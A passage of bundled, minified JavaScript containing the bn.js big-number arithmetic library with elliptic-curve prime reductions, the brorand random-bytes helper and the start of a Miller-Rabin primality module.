                var Z = 2 * this.guessLen13b(q.length, L.length)
                  , te = this.makeRBT(Z)
                  , se = this.stub(Z)
                  , de = new Array(Z)
                  , re = new Array(Z)
                  , $ = new Array(Z)
                  , ie = new Array(Z)
                  , ve = new Array(Z)
                  , ge = new Array(Z)
                  , Re = U.words;
                Re.length = Z,
                this.convert13b(q.words, q.length, de, Z),
                this.convert13b(L.words, L.length, ie, Z),
                this.transform(de, se, re, $, Z, te),
                this.transform(ie, se, ve, ge, Z, te);
                for (var Pe = 0; Pe < Z; Pe++) {
                    var Ie = re[Pe] * ve[Pe] - $[Pe] * ge[Pe];
                    $[Pe] = re[Pe] * ge[Pe] + $[Pe] * ve[Pe],
                    re[Pe] = Ie
                }
                return this.conjugate(re, $, Z),
                this.transform(re, $, Re, se, Z, te),
                this.conjugate(Re, se, Z),
                this.normalize13b(Re, Z),
                U.negative = q.negative ^ L.negative,
                U.length = q.length + L.length,
                U.strip()
            }
            ,
            w.prototype.mul = function(q) {
                var L = new w(null);
                return L.words = new Array(this.length + q.length),
                this.mulTo(q, L)
            }
            ,
            w.prototype.mulf = function(q) {
                var L = new w(null);
                return L.words = new Array(this.length + q.length),
                ue(this, q, L)
            }
            ,
            w.prototype.imul = function(q) {
                return this.clone().mulTo(q, this)
            }
            ,
            w.prototype.imuln = function(q) {
                O(typeof q == "number"),
                O(q < 67108864);
                for (var L = 0, U = 0; U < this.length; U++) {
                    var Z = (this.words[U] | 0) * q
                      , te = (Z & 67108863) + (L & 67108863);
                    L >>= 26,
                    L += Z / 67108864 | 0,
                    L += te >>> 26,
                    this.words[U] = te & 67108863
                }
                return L !== 0 && (this.words[U] = L,
                this.length++),
                this.length = q === 0 ? 1 : this.length,
                this
            }
            ,
            w.prototype.muln = function(q) {
                return this.clone().imuln(q)
            }
            ,
            w.prototype.sqr = function() {
                return this.mul(this)
            }
            ,
            w.prototype.isqr = function() {
                return this.imul(this.clone())
            }
            ,
            w.prototype.pow = function(q) {
                var L = ee(q);
                if (L.length === 0)
                    return new w(1);
                for (var U = this, Z = 0; Z < L.length && L[Z] === 0; Z++,
                U = U.sqr())
                    ;
                if (++Z < L.length)
                    for (var te = U.sqr(); Z < L.length; Z++,
                    te = te.sqr())
                        L[Z] !== 0 && (U = U.mul(te));
                return U
            }
            ,
            w.prototype.iushln = function(q) {
                O(typeof q == "number" && q >= 0);
                var L = q % 26, U = (q - L) / 26, Z = 67108863 >>> 26 - L << 26 - L, te;
                if (L !== 0) {
                    var se = 0;
                    for (te = 0; te < this.length; te++) {
                        var de = this.words[te] & Z
                          , re = (this.words[te] | 0) - de << L;
                        this.words[te] = re | se,
                        se = de >>> 26 - L
                    }
                    se && (this.words[te] = se,
                    this.length++)
                }
                if (U !== 0) {
                    for (te = this.length - 1; te >= 0; te--)
                        this.words[te + U] = this.words[te];
                    for (te = 0; te < U; te++)
                        this.words[te] = 0;
                    this.length += U
                }
                return this.strip()
            }
            ,
            w.prototype.ishln = function(q) {
                return O(this.negative === 0),
                this.iushln(q)
            }
            ,
            w.prototype.iushrn = function(q, L, U) {
                O(typeof q == "number" && q >= 0);
                var Z;
                L ? Z = (L - L % 26) / 26 : Z = 0;
                var te = q % 26
                  , se = Math.min((q - te) / 26, this.length)
                  , de = 67108863 ^ 67108863 >>> te << te
                  , re = U;
                if (Z -= se,
                Z = Math.max(0, Z),
                re) {
                    for (var $ = 0; $ < se; $++)
                        re.words[$] = this.words[$];
                    re.length = se
                }
                if (se !== 0)
                    if (this.length > se)
                        for (this.length -= se,
                        $ = 0; $ < this.length; $++)
                            this.words[$] = this.words[$ + se];
                    else
                        this.words[0] = 0,
                        this.length = 1;
                var ie = 0;
                for ($ = this.length - 1; $ >= 0 && (ie !== 0 || $ >= Z); $--) {
                    var ve = this.words[$] | 0;
                    this.words[$] = ie << 26 - te | ve >>> te,
                    ie = ve & de
                }
                return re && ie !== 0 && (re.words[re.length++] = ie),
                this.length === 0 && (this.words[0] = 0,
                this.length = 1),
                this.strip()
            }
            ,
            w.prototype.ishrn = function(q, L, U) {
                return O(this.negative === 0),
                this.iushrn(q, L, U)
            }
            ,
            w.prototype.shln = function(q) {
                return this.clone().ishln(q)
            }
            ,
            w.prototype.ushln = function(q) {
                return this.clone().iushln(q)
            }
            ,
            w.prototype.shrn = function(q) {
                return this.clone().ishrn(q)
            }
            ,
            w.prototype.ushrn = function(q) {
                return this.clone().iushrn(q)
            }
            ,
            w.prototype.testn = function(q) {
                O(typeof q == "number" && q >= 0);
                var L = q % 26
                  , U = (q - L) / 26
                  , Z = 1 << L;
                if (this.length <= U)
                    return !1;
                var te = this.words[U];
                return !!(te & Z)
            }
            ,
            w.prototype.imaskn = function(q) {
                O(typeof q == "number" && q >= 0);
                var L = q % 26
                  , U = (q - L) / 26;
                if (O(this.negative === 0, "imaskn works only with positive numbers"),
                this.length <= U)
                    return this;
                if (L !== 0 && U++,
                this.length = Math.min(U, this.length),
                L !== 0) {
                    var Z = 67108863 ^ 67108863 >>> L << L;
                    this.words[this.length - 1] &= Z
                }
                return this.strip()
            }
            ,
            w.prototype.maskn = function(q) {
                return this.clone().imaskn(q)
            }
            ,
            w.prototype.iaddn = function(q) {
                return O(typeof q == "number"),
                O(q < 67108864),
                q < 0 ? this.isubn(-q) : this.negative !== 0 ? this.length === 1 && (this.words[0] | 0) < q ? (this.words[0] = q - (this.words[0] | 0),
                this.negative = 0,
                this) : (this.negative = 0,
                this.isubn(q),
                this.negative = 1,
                this) : this._iaddn(q)
            }
            ,
            w.prototype._iaddn = function(q) {
                this.words[0] += q;
                for (var L = 0; L < this.length && this.words[L] >= 67108864; L++)
                    this.words[L] -= 67108864,
                    L === this.length - 1 ? this.words[L + 1] = 1 : this.words[L + 1]++;
                return this.length = Math.max(this.length, L + 1),
                this
            }
            ,
            w.prototype.isubn = function(q) {
                if (O(typeof q == "number"),
                O(q < 67108864),
                q < 0)
                    return this.iaddn(-q);
                if (this.negative !== 0)
                    return this.negative = 0,
                    this.iaddn(q),
                    this.negative = 1,
                    this;
                if (this.words[0] -= q,
                this.length === 1 && this.words[0] < 0)
                    this.words[0] = -this.words[0],
                    this.negative = 1;
                else
                    for (var L = 0; L < this.length && this.words[L] < 0; L++)
                        this.words[L] += 67108864,
                        this.words[L + 1] -= 1;
                return this.strip()
            }
            ,
            w.prototype.addn = function(q) {
                return this.clone().iaddn(q)
            }
            ,
            w.prototype.subn = function(q) {
                return this.clone().isubn(q)
            }
            ,
            w.prototype.iabs = function() {
                return this.negative = 0,
                this
            }
            ,
            w.prototype.abs = function() {
                return this.clone().iabs()
            }
            ,
            w.prototype._ishlnsubmul = function(q, L, U) {
                var Z = q.length + U, te;
                this._expand(Z);
                var se, de = 0;
                for (te = 0; te < q.length; te++) {
                    se = (this.words[te + U] | 0) + de;
                    var re = (q.words[te] | 0) * L;
                    se -= re & 67108863,
                    de = (se >> 26) - (re / 67108864 | 0),
                    this.words[te + U] = se & 67108863
                }
                for (; te < this.length - U; te++)
                    se = (this.words[te + U] | 0) + de,
                    de = se >> 26,
                    this.words[te + U] = se & 67108863;
                if (de === 0)
                    return this.strip();
                for (O(de === -1),
                de = 0,
                te = 0; te < this.length; te++)
                    se = -(this.words[te] | 0) + de,
                    de = se >> 26,
                    this.words[te] = se & 67108863;
                return this.negative = 1,
                this.strip()
            }
            ,
            w.prototype._wordDiv = function(q, L) {
                var U = this.length - q.length
                  , Z = this.clone()
                  , te = q
                  , se = te.words[te.length - 1] | 0
                  , de = this._countBits(se);
                U = 26 - de,
                U !== 0 && (te = te.ushln(U),
                Z.iushln(U),
                se = te.words[te.length - 1] | 0);
                var re = Z.length - te.length, $;
                if (L !== "mod") {
                    $ = new w(null),
                    $.length = re + 1,
                    $.words = new Array($.length);
                    for (var ie = 0; ie < $.length; ie++)
                        $.words[ie] = 0
                }
                var ve = Z.clone()._ishlnsubmul(te, 1, re);
                ve.negative === 0 && (Z = ve,
                $ && ($.words[re] = 1));
                for (var ge = re - 1; ge >= 0; ge--) {
                    var Re = (Z.words[te.length + ge] | 0) * 67108864 + (Z.words[te.length + ge - 1] | 0);
                    for (Re = Math.min(Re / se | 0, 67108863),
                    Z._ishlnsubmul(te, Re, ge); Z.negative !== 0; )
                        Re--,
                        Z.negative = 0,
                        Z._ishlnsubmul(te, 1, ge),
                        Z.isZero() || (Z.negative ^= 1);
                    $ && ($.words[ge] = Re)
                }
                return $ && $.strip(),
                Z.strip(),
                L !== "div" && U !== 0 && Z.iushrn(U),
                {
                    div: $ || null,
                    mod: Z
                }
            }
            ,
            w.prototype.divmod = function(q, L, U) {
                if (O(!q.isZero()),
                this.isZero())
                    return {
                        div: new w(0),
                        mod: new w(0)
                    };
                var Z, te, se;
                return this.negative !== 0 && q.negative === 0 ? (se = this.neg().divmod(q, L),
                L !== "mod" && (Z = se.div.neg()),
                L !== "div" && (te = se.mod.neg(),
                U && te.negative !== 0 && te.iadd(q)),
                {
                    div: Z,
                    mod: te
                }) : this.negative === 0 && q.negative !== 0 ? (se = this.divmod(q.neg(), L),
                L !== "mod" && (Z = se.div.neg()),
                {
                    div: Z,
                    mod: se.mod
                }) : (this.negative & q.negative) !== 0 ? (se = this.neg().divmod(q.neg(), L),
                L !== "div" && (te = se.mod.neg(),
                U && te.negative !== 0 && te.isub(q)),
                {
                    div: se.div,
                    mod: te
                }) : q.length > this.length || this.cmp(q) < 0 ? {
                    div: new w(0),
                    mod: this
                } : q.length === 1 ? L === "div" ? {
                    div: this.divn(q.words[0]),
                    mod: null
                } : L === "mod" ? {
                    div: null,
                    mod: new w(this.modn(q.words[0]))
                } : {
                    div: this.divn(q.words[0]),
                    mod: new w(this.modn(q.words[0]))
                } : this._wordDiv(q, L)
            }
            ,
            w.prototype.div = function(q) {
                return this.divmod(q, "div", !1).div
            }
            ,
            w.prototype.mod = function(q) {
                return this.divmod(q, "mod", !1).mod
            }
            ,
            w.prototype.umod = function(q) {
                return this.divmod(q, "mod", !0).mod
            }
            ,
            w.prototype.divRound = function(q) {
                var L = this.divmod(q);
                if (L.mod.isZero())
                    return L.div;
                var U = L.div.negative !== 0 ? L.mod.isub(q) : L.mod
                  , Z = q.ushrn(1)
                  , te = q.andln(1)
                  , se = U.cmp(Z);
                return se < 0 || te === 1 && se === 0 ? L.div : L.div.negative !== 0 ? L.div.isubn(1) : L.div.iaddn(1)
            }
            ,
            w.prototype.modn = function(q) {
                O(q <= 67108863);
                for (var L = (1 << 26) % q, U = 0, Z = this.length - 1; Z >= 0; Z--)
                    U = (L * U + (this.words[Z] | 0)) % q;
                return U
            }
            ,
            w.prototype.idivn = function(q) {
                O(q <= 67108863);
                for (var L = 0, U = this.length - 1; U >= 0; U--) {
                    var Z = (this.words[U] | 0) + L * 67108864;
                    this.words[U] = Z / q | 0,
                    L = Z % q
                }
                return this.strip()
            }
            ,
            w.prototype.divn = function(q) {
                return this.clone().idivn(q)
            }
            ,
            w.prototype.egcd = function(q) {
                O(q.negative === 0),
                O(!q.isZero());
                var L = this
                  , U = q.clone();
                L.negative !== 0 ? L = L.umod(q) : L = L.clone();
                for (var Z = new w(1), te = new w(0), se = new w(0), de = new w(1), re = 0; L.isEven() && U.isEven(); )
                    L.iushrn(1),
                    U.iushrn(1),
                    ++re;
                for (var $ = U.clone(), ie = L.clone(); !L.isZero(); ) {
                    for (var ve = 0, ge = 1; (L.words[0] & ge) === 0 && ve < 26; ++ve,
                    ge <<= 1)
                        ;
                    if (ve > 0)
                        for (L.iushrn(ve); ve-- > 0; )
                            (Z.isOdd() || te.isOdd()) && (Z.iadd($),
                            te.isub(ie)),
                            Z.iushrn(1),
                            te.iushrn(1);
                    for (var Re = 0, Pe = 1; (U.words[0] & Pe) === 0 && Re < 26; ++Re,
                    Pe <<= 1)
                        ;
                    if (Re > 0)
                        for (U.iushrn(Re); Re-- > 0; )
                            (se.isOdd() || de.isOdd()) && (se.iadd($),
                            de.isub(ie)),
                            se.iushrn(1),
                            de.iushrn(1);
                    L.cmp(U) >= 0 ? (L.isub(U),
                    Z.isub(se),
                    te.isub(de)) : (U.isub(L),
                    se.isub(Z),
                    de.isub(te))
                }
                return {
                    a: se,
                    b: de,
                    gcd: U.iushln(re)
                }
            }
            ,
            w.prototype._invmp = function(q) {
                O(q.negative === 0),
                O(!q.isZero());
                var L = this
                  , U = q.clone();
                L.negative !== 0 ? L = L.umod(q) : L = L.clone();
                for (var Z = new w(1), te = new w(0), se = U.clone(); L.cmpn(1) > 0 && U.cmpn(1) > 0; ) {
                    for (var de = 0, re = 1; (L.words[0] & re) === 0 && de < 26; ++de,
                    re <<= 1)
                        ;
                    if (de > 0)
                        for (L.iushrn(de); de-- > 0; )
                            Z.isOdd() && Z.iadd(se),
                            Z.iushrn(1);
                    for (var $ = 0, ie = 1; (U.words[0] & ie) === 0 && $ < 26; ++$,
                    ie <<= 1)
                        ;
                    if ($ > 0)
                        for (U.iushrn($); $-- > 0; )
                            te.isOdd() && te.iadd(se),
                            te.iushrn(1);
                    L.cmp(U) >= 0 ? (L.isub(U),
                    Z.isub(te)) : (U.isub(L),
                    te.isub(Z))
                }
                var ve;
                return L.cmpn(1) === 0 ? ve = Z : ve = te,
                ve.cmpn(0) < 0 && ve.iadd(q),
                ve
            }
            ,
            w.prototype.gcd = function(q) {
                if (this.isZero())
                    return q.abs();
                if (q.isZero())
                    return this.abs();
                var L = this.clone()
                  , U = q.clone();
                L.negative = 0,
                U.negative = 0;
                for (var Z = 0; L.isEven() && U.isEven(); Z++)
                    L.iushrn(1),
                    U.iushrn(1);
                do {
                    for (; L.isEven(); )
                        L.iushrn(1);
                    for (; U.isEven(); )
                        U.iushrn(1);
                    var te = L.cmp(U);
                    if (te < 0) {
                        var se = L;
                        L = U,
                        U = se
                    } else if (te === 0 || U.cmpn(1) === 0)
                        break;
                    L.isub(U)
                } while (!0);
                return U.iushln(Z)
            }
            ,
            w.prototype.invm = function(q) {
                return this.egcd(q).a.umod(q)
            }
            ,
            w.prototype.isEven = function() {
                return (this.words[0] & 1) === 0
            }
            ,
            w.prototype.isOdd = function() {
                return (this.words[0] & 1) === 1
            }
            ,
            w.prototype.andln = function(q) {
                return this.words[0] & q
            }
            ,
            w.prototype.bincn = function(q) {
                O(typeof q == "number");
                var L = q % 26
                  , U = (q - L) / 26
                  , Z = 1 << L;
                if (this.length <= U)
                    return this._expand(U + 1),
                    this.words[U] |= Z,
                    this;
                for (var te = Z, se = U; te !== 0 && se < this.length; se++) {
                    var de = this.words[se] | 0;
                    de += te,
                    te = de >>> 26,
                    de &= 67108863,
                    this.words[se] = de
                }
                return te !== 0 && (this.words[se] = te,
                this.length++),
                this
            }
            ,
            w.prototype.isZero = function() {
                return this.length === 1 && this.words[0] === 0
            }
            ,
            w.prototype.cmpn = function(q) {
                var L = q < 0;
                if (this.negative !== 0 && !L)
                    return -1;
                if (this.negative === 0 && L)
                    return 1;
                this.strip();
                var U;
                if (this.length > 1)
                    U = 1;
                else {
                    L && (q = -q),
                    O(q <= 67108863, "Number is too big");
                    var Z = this.words[0] | 0;
                    U = Z === q ? 0 : Z < q ? -1 : 1
                }
                return this.negative !== 0 ? -U | 0 : U
            }
            ,
            w.prototype.cmp = function(q) {
                if (this.negative !== 0 && q.negative === 0)
                    return -1;
                if (this.negative === 0 && q.negative !== 0)
                    return 1;
                var L = this.ucmp(q);
                return this.negative !== 0 ? -L | 0 : L
            }
            ,
            w.prototype.ucmp = function(q) {
                if (this.length > q.length)
                    return 1;
                if (this.length < q.length)
                    return -1;
                for (var L = 0, U = this.length - 1; U >= 0; U--) {
                    var Z = this.words[U] | 0
                      , te = q.words[U] | 0;
                    if (Z !== te) {
                        Z < te ? L = -1 : Z > te && (L = 1);
                        break
                    }
                }
                return L
            }
            ,
            w.prototype.gtn = function(q) {
                return this.cmpn(q) === 1
            }
            ,
            w.prototype.gt = function(q) {
                return this.cmp(q) === 1
            }
            ,
            w.prototype.gten = function(q) {
                return this.cmpn(q) >= 0
            }
            ,
            w.prototype.gte = function(q) {
                return this.cmp(q) >= 0
            }
            ,
            w.prototype.ltn = function(q) {
                return this.cmpn(q) === -1
            }
            ,
            w.prototype.lt = function(q) {
                return this.cmp(q) === -1
            }
            ,
            w.prototype.lten = function(q) {
                return this.cmpn(q) <= 0
            }
            ,
            w.prototype.lte = function(q) {
                return this.cmp(q) <= 0
            }
            ,
            w.prototype.eqn = function(q) {
                return this.cmpn(q) === 0
            }
            ,
            w.prototype.eq = function(q) {
                return this.cmp(q) === 0
            }
            ,
            w.red = function(q) {
                return new Ee(q)
            }
            ,
            w.prototype.toRed = function(q) {
                return O(!this.red, "Already a number in reduction context"),
                O(this.negative === 0, "red works only with positives"),
                q.convertTo(this)._forceRed(q)
            }
            ,
            w.prototype.fromRed = function() {
                return O(this.red, "fromRed works only with numbers in reduction context"),
                this.red.convertFrom(this)
            }
            ,
            w.prototype._forceRed = function(q) {
                return this.red = q,
                this
            }
            ,
            w.prototype.forceRed = function(q) {
                return O(!this.red, "Already a number in reduction context"),
                this._forceRed(q)
            }
            ,
            w.prototype.redAdd = function(q) {
                return O(this.red, "redAdd works only with red numbers"),
                this.red.add(this, q)
            }
            ,
            w.prototype.redIAdd = function(q) {
                return O(this.red, "redIAdd works only with red numbers"),
                this.red.iadd(this, q)
            }
            ,
            w.prototype.redSub = function(q) {
                return O(this.red, "redSub works only with red numbers"),
                this.red.sub(this, q)
            }
            ,
            w.prototype.redISub = function(q) {
                return O(this.red, "redISub works only with red numbers"),
                this.red.isub(this, q)
            }
            ,
            w.prototype.redShl = function(q) {
                return O(this.red, "redShl works only with red numbers"),
                this.red.shl(this, q)
            }
            ,
            w.prototype.redMul = function(q) {
                return O(this.red, "redMul works only with red numbers"),
                this.red._verify2(this, q),
                this.red.mul(this, q)
            }
            ,
            w.prototype.redIMul = function(q) {
                return O(this.red, "redMul works only with red numbers"),
                this.red._verify2(this, q),
                this.red.imul(this, q)
            }
            ,
            w.prototype.redSqr = function() {
                return O(this.red, "redSqr works only with red numbers"),
                this.red._verify1(this),
                this.red.sqr(this)
            }
            ,
            w.prototype.redISqr = function() {
                return O(this.red, "redISqr works only with red numbers"),
                this.red._verify1(this),
                this.red.isqr(this)
            }
            ,
            w.prototype.redSqrt = function() {
                return O(this.red, "redSqrt works only with red numbers"),
                this.red._verify1(this),
                this.red.sqrt(this)
            }
            ,
            w.prototype.redInvm = function() {
                return O(this.red, "redInvm works only with red numbers"),
                this.red._verify1(this),
                this.red.invm(this)
            }
            ,
            w.prototype.redNeg = function() {
                return O(this.red, "redNeg works only with red numbers"),
                this.red._verify1(this),
                this.red.neg(this)
            }
            ,
            w.prototype.redPow = function(q) {
                return O(this.red && !q.red, "redPow(normalNum)"),
                this.red._verify1(this),
                this.red.pow(this, q)
            }
            ;
            var he = {
                k256: null,
                p224: null,
                p192: null,
                p25519: null
            };
            function pe(ce, q) {
                this.name = ce,
                this.p = new w(q,16),
                this.n = this.p.bitLength(),
                this.k = new w(1).iushln(this.n).isub(this.p),
                this.tmp = this._tmp()
            }
            pe.prototype._tmp = function() {
                var q = new w(null);
                return q.words = new Array(Math.ceil(this.n / 13)),
                q
            }
            ,
            pe.prototype.ireduce = function(q) {
                var L = q, U;
                do
                    this.split(L, this.tmp),
                    L = this.imulK(L),
                    L = L.iadd(this.tmp),
                    U = L.bitLength();
                while (U > this.n);
                var Z = U < this.n ? -1 : L.ucmp(this.p);
                return Z === 0 ? (L.words[0] = 0,
                L.length = 1) : Z > 0 ? L.isub(this.p) : L.strip !== void 0 ? L.strip() : L._strip(),
                L
            }
            ,
            pe.prototype.split = function(q, L) {
                q.iushrn(this.n, 0, L)
            }
            ,
            pe.prototype.imulK = function(q) {
                return q.imul(this.k)
            }
            ;
            function ye() {
                pe.call(this, "k256", "ffffffff ffffffff ffffffff ffffffff ffffffff ffffffff fffffffe fffffc2f")
            }
            x(ye, pe),
            ye.prototype.split = function(q, L) {
                for (var U = 4194303, Z = Math.min(q.length, 9), te = 0; te < Z; te++)
                    L.words[te] = q.words[te];
                if (L.length = Z,
                q.length <= 9) {
                    q.words[0] = 0,
                    q.length = 1;
                    return
                }
                var se = q.words[9];
                for (L.words[L.length++] = se & U,
                te = 10; te < q.length; te++) {
                    var de = q.words[te] | 0;
                    q.words[te - 10] = (de & U) << 4 | se >>> 22,
                    se = de
                }
                se >>>= 22,
                q.words[te - 10] = se,
                se === 0 && q.length > 10 ? q.length -= 10 : q.length -= 9
            }
            ,
            ye.prototype.imulK = function(q) {
                q.words[q.length] = 0,
                q.words[q.length + 1] = 0,
                q.length += 2;
                for (var L = 0, U = 0; U < q.length; U++) {
                    var Z = q.words[U] | 0;
                    L += Z * 977,
                    q.words[U] = L & 67108863,
                    L = Z * 64 + (L / 67108864 | 0)
                }
                return q.words[q.length - 1] === 0 && (q.length--,
                q.words[q.length - 1] === 0 && q.length--),
                q
            }
            ;
            function be() {
                pe.call(this, "p224", "ffffffff ffffffff ffffffff ffffffff 00000000 00000000 00000001")
            }
            x(be, pe);
            function xe() {
                pe.call(this, "p192", "ffffffff ffffffff ffffffff fffffffe ffffffff ffffffff")
            }
            x(xe, pe);
            function Ae() {
                pe.call(this, "25519", "7fffffffffffffff ffffffffffffffff ffffffffffffffff ffffffffffffffed")
            }
            x(Ae, pe),
            Ae.prototype.imulK = function(q) {
                for (var L = 0, U = 0; U < q.length; U++) {
                    var Z = (q.words[U] | 0) * 19 + L
                      , te = Z & 67108863;
                    Z >>>= 26,
                    q.words[U] = te,
                    L = Z
                }
                return L !== 0 && (q.words[q.length++] = L),
                q
            }
            ,
            w._prime = function(q) {
                if (he[q])
                    return he[q];
                var L;
                if (q === "k256")
                    L = new ye;
                else if (q === "p224")
                    L = new be;
                else if (q === "p192")
                    L = new xe;
                else if (q === "p25519")
                    L = new Ae;
                else
                    throw new Error("Unknown prime " + q);
                return he[q] = L,
                L
            }
            ;
            function Ee(ce) {
                if (typeof ce == "string") {
                    var q = w._prime(ce);
                    this.m = q.p,
                    this.prime = q
                } else
                    O(ce.gtn(1), "modulus must be greater than 1"),
                    this.m = ce,
                    this.prime = null
            }
            Ee.prototype._verify1 = function(q) {
                O(q.negative === 0, "red works only with positives"),
                O(q.red, "red works only with red numbers")
            }
            ,
            Ee.prototype._verify2 = function(q, L) {
                O((q.negative | L.negative) === 0, "red works only with positives"),
                O(q.red && q.red === L.red, "red works only with red numbers")
            }
            ,
            Ee.prototype.imod = function(q) {
                return this.prime ? this.prime.ireduce(q)._forceRed(this) : q.umod(this.m)._forceRed(this)
            }
            ,
            Ee.prototype.neg = function(q) {
                return q.isZero() ? q.clone() : this.m.sub(q)._forceRed(this)
            }
            ,
            Ee.prototype.add = function(q, L) {
                this._verify2(q, L);
                var U = q.add(L);
                return U.cmp(this.m) >= 0 && U.isub(this.m),
                U._forceRed(this)
            }
            ,
            Ee.prototype.iadd = function(q, L) {
                this._verify2(q, L);
                var U = q.iadd(L);
                return U.cmp(this.m) >= 0 && U.isub(this.m),
                U
            }
            ,
            Ee.prototype.sub = function(q, L) {
                this._verify2(q, L);
                var U = q.sub(L);
                return U.cmpn(0) < 0 && U.iadd(this.m),
                U._forceRed(this)
            }
            ,
            Ee.prototype.isub = function(q, L) {
                this._verify2(q, L);
                var U = q.isub(L);
                return U.cmpn(0) < 0 && U.iadd(this.m),
                U
            }
            ,
            Ee.prototype.shl = function(q, L) {
                return this._verify1(q),
                this.imod(q.ushln(L))
            }
            ,
            Ee.prototype.imul = function(q, L) {
                return this._verify2(q, L),
                this.imod(q.imul(L))
            }
            ,
            Ee.prototype.mul = function(q, L) {
                return this._verify2(q, L),
                this.imod(q.mul(L))
            }
            ,
            Ee.prototype.isqr = function(q) {
                return this.imul(q, q.clone())
            }
            ,
            Ee.prototype.sqr = function(q) {
                return this.mul(q, q)
            }
            ,
            Ee.prototype.sqrt = function(q) {
                if (q.isZero())
                    return q.clone();
                var L = this.m.andln(3);
                if (O(L % 2 === 1),
                L === 3) {
                    var U = this.m.add(new w(1)).iushrn(2);
                    return this.pow(q, U)
                }
                for (var Z = this.m.subn(1), te = 0; !Z.isZero() && Z.andln(1) === 0; )
                    te++,
                    Z.iushrn(1);
                O(!Z.isZero());
                var se = new w(1).toRed(this)
                  , de = se.redNeg()
                  , re = this.m.subn(1).iushrn(1)
                  , $ = this.m.bitLength();
                for ($ = new w(2 * $ * $).toRed(this); this.pow($, re).cmp(de) !== 0; )
                    $.redIAdd(de);
                for (var ie = this.pow($, Z), ve = this.pow(q, Z.addn(1).iushrn(1)), ge = this.pow(q, Z), Re = te; ge.cmp(se) !== 0; ) {
                    for (var Pe = ge, Ie = 0; Pe.cmp(se) !== 0; Ie++)
                        Pe = Pe.redSqr();
                    O(Ie < Re);
                    var Te = this.pow(ie, new w(1).iushln(Re - Ie - 1));
                    ve = ve.redMul(Te),
                    ie = Te.redSqr(),
                    ge = ge.redMul(ie),
                    Re = Ie
                }
                return ve
            }
            ,
            Ee.prototype.invm = function(q) {
                var L = q._invmp(this.m);
                return L.negative !== 0 ? (L.negative = 0,
                this.imod(L).redNeg()) : this.imod(L)
            }
            ,
            Ee.prototype.pow = function(q, L) {
                if (L.isZero())
                    return new w(1).toRed(this);
                if (L.cmpn(1) === 0)
                    return q.clone();
                var U = 4
                  , Z = new Array(1 << U);
                Z[0] = new w(1).toRed(this),
                Z[1] = q;
                for (var te = 2; te < Z.length; te++)
                    Z[te] = this.mul(Z[te - 1], q);
                var se = Z[0]
                  , de = 0
                  , re = 0
                  , $ = L.bitLength() % 26;
                for ($ === 0 && ($ = 26),
                te = L.length - 1; te >= 0; te--) {
                    for (var ie = L.words[te], ve = $ - 1; ve >= 0; ve--) {
                        var ge = ie >> ve & 1;
                        if (se !== Z[0] && (se = this.sqr(se)),
                        ge === 0 && de === 0) {
                            re = 0;
                            continue
                        }
                        de <<= 1,
                        de |= ge,
                        re++,
                        !(re !== U && (te !== 0 || ve !== 0)) && (se = this.mul(se, Z[de]),
                        re = 0,
                        de = 0)
                    }
                    $ = 26
                }
                return se
            }
            ,
            Ee.prototype.convertTo = function(q) {
                var L = q.umod(this.m);
                return L === q ? L.clone() : L
            }
            ,
            Ee.prototype.convertFrom = function(q) {
                var L = q.clone();
                return L.red = null,
                L
            }
            ,
            w.mont = function(q) {
                return new Be(q)
            }
            ;
            function Be(ce) {
                Ee.call(this, ce),
                this.shift = this.m.bitLength(),
                this.shift % 26 !== 0 && (this.shift += 26 - this.shift % 26),
                this.r = new w(1).iushln(this.shift),
                this.r2 = this.imod(this.r.sqr()),
                this.rinv = this.r._invmp(this.m),
                this.minv = this.rinv.mul(this.r).isubn(1).div(this.m),
                this.minv = this.minv.umod(this.r),
                this.minv = this.r.sub(this.minv)
            }
            x(Be, Ee),
            Be.prototype.convertTo = function(q) {
                return this.imod(q.ushln(this.shift))
            }
            ,
            Be.prototype.convertFrom = function(q) {
                var L = this.imod(q.mul(this.rinv));
                return L.red = null,
                L
            }
            ,
            Be.prototype.imul = function(q, L) {
                if (q.isZero() || L.isZero())
                    return q.words[0] = 0,
                    q.length = 1,
                    q;
                var U = q.imul(L)
                  , Z = U.maskn(this.shift).mul(this.minv).imaskn(this.shift).mul(this.m)
                  , te = U.isub(Z).iushrn(this.shift)
                  , se = te;
                return te.cmp(this.m) >= 0 ? se = te.isub(this.m) : te.cmpn(0) < 0 && (se = te.iadd(this.m)),
                se._forceRed(this)
            }
            ,
            Be.prototype.mul = function(q, L) {
                if (q.isZero() || L.isZero())
                    return new w(0)._forceRed(this);
                var U = q.mul(L)
                  , Z = U.maskn(this.shift).mul(this.minv).imaskn(this.shift).mul(this.m)
                  , te = U.isub(Z).iushrn(this.shift)
                  , se = te;
                return te.cmp(this.m) >= 0 ? se = te.isub(this.m) : te.cmpn(0) < 0 && (se = te.iadd(this.m)),
                se._forceRed(this)
            }
            ,
            Be.prototype.invm = function(q) {
                var L = this.imod(q._invmp(this.m).mul(this.r2));
                return L._forceRed(this)
            }
        }
        )(_, bn$a)
    }(bn$b)),
    bn$b.exports
}
var brorand = {
    exports: {}
}, hasRequiredBrorand;
function requireBrorand() {
    if (hasRequiredBrorand)
        return brorand.exports;
    hasRequiredBrorand = 1;
    var _;
    brorand.exports = function(x) {
        return _ || (_ = new M(null)),
        _.generate(x)
    }
    ;
    function M(O) {
        this.rand = O
    }
    if (brorand.exports.Rand = M,
    M.prototype.generate = function(x) {
        return this._rand(x)
    }
    ,
    M.prototype._rand = function(x) {
        if (this.rand.getBytes)
            return this.rand.getBytes(x);
        for (var w = new Uint8Array(x), b = 0; b < w.length; b++)
            w[b] = this.rand.getByte();
        return w
    }
    ,
    typeof self == "object")
        self.crypto && self.crypto.getRandomValues ? M.prototype._rand = function(x) {
            var w = new Uint8Array(x);
            return self.crypto.getRandomValues(w),
            w
        }
        : self.msCrypto && self.msCrypto.getRandomValues ? M.prototype._rand = function(x) {
            var w = new Uint8Array(x);
            return self.msCrypto.getRandomValues(w),
            w
        }
        : typeof window == "object" && (M.prototype._rand = function() {
            throw new Error("Not implemented yet")
        }
        );
    else
        try {
            var j = requireCryptoBrowserify();
            if (typeof j.randomBytes != "function")
                throw new Error("Not supported");
            M.prototype._rand = function(x) {
                return j.randomBytes(x)
            }
        } catch {}
    return brorand.exports
}
var mr, hasRequiredMr;
function requireMr() {
    if (hasRequiredMr)
        return mr;
    hasRequiredMr = 1;
    var _ = requireBn$5()
      , M = requireBrorand();
    function j(O) {
        this.rand = O || new M.Rand
    }
    return mr = j,
    j.create = function(x) {
        return new j(x)
    }
    ,
    j.prototype._randbelow = function(x) {
        var w = x.bitLength()
          , b = Math.ceil(w / 8);
        do
            var X = new _(this.rand.generate(b));
        while (X.cmp(x) >= 0);
        return X
